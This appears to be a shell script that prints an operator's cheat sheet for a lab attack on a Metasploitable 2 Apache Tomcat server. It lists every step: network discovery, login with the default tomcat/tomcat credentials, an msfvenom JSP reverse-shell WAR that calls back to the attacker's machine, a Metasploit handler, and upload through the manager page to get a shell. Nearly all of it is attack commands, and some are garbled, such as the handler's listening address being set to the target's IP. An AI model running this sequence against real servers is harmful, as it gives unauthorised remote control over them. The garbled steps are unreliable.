echo '
--] APACHE TOMCAT WAR REVERSE 38

OPERATOR   === KALI               IP === 132
CHARLIE    === METASPLOITE 2      IP === 131
LAB        === NET                ALL === 172.16.14.IP


OPERATOR    ==> TASK ==> sudo su << for to be root
OPERATOR    ==> TASK ==> netdicover -r 172.16.14.0/24
OPERATOR    ==> TASK ==> nmap -sV IP_CHARLIE
OPERATOR    ==> TASK ==> firefox IP_CHARLIE:8180/admin 
OPERATOR    ==> TASK ==> tomcat tomcat

OPERATOR    ==> TASK ==> msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP_OPERATOR LPORT=4444 -f war > shell.war
OPERATOR    ==> TASK ==> msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.14.132 LPORT=4444 -f war > shell.war

OPERATOR    ==> TASK ==> msfconsole -q
OPERATOR    ==> TASK ==> use exploit/multi/handler 
OPERATOR    ==> TASK ==> set payload java/jsp_shell_reverse_tcp 
OPERATOR    ==> TASK ==> set lhost IP_CHARLIE
OPERATOR    ==> TASK ==> set lport 4444
OPERATOR    ==> TASK ==> exploit -j

OPERATOR    ==> TASK ==> firefox IP_CHARLIE:8180/manager
OPERATOR    ==> TASK ==> firefox IP_CHARLIE:8180/manager && uplaod shell.war AND click in shell.war
OPERATOR    ==> TASK ==> session -i 
OPERATOR    ==> TASK ==> session -i 1
OPERATOR    ==> TASK ==> whoami

'
read